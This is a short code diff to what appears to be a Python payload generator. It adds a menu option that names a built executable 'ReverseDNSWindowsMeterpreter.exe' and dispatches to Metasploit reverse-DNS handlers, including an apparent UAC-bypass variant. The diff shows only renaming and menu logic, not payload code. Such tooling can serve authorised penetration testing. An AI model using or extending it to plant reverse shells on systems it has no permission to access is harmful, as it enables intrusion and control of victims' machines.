@@ -218,6 +218,10 @@ try:
             payloadname = 'ReverseHTTPSWindowsMeterpreter.exe'
             os.system('mv %s/dist/payload.exe %s/%s' %
                       (payloaddir, payloaddir, payloadname))
+        elif menuchoice == '5':
+            payloadname = 'ReverseDNSWindowsMeterpreter.exe'
+            os.system('mv %s/dist/payload.exe %s/%s' %
+                      (payloaddir, payloaddir, payloadname))
         else:
             os.system('mv %s/dist/payload.exe %s/payload.exe' %
                       (payloaddir, payloaddir))
@@ -299,7 +303,7 @@ try:
             METASPLOIT().methttp_persistence(portnum)
         else:
             METASPLOIT().methttp_normal(portnum)
-            
+
     elif menuchoice == '5':
         if want_UACBYPASS.lower() == 'y':
             METASPLOIT().metdns_uac(portnum)
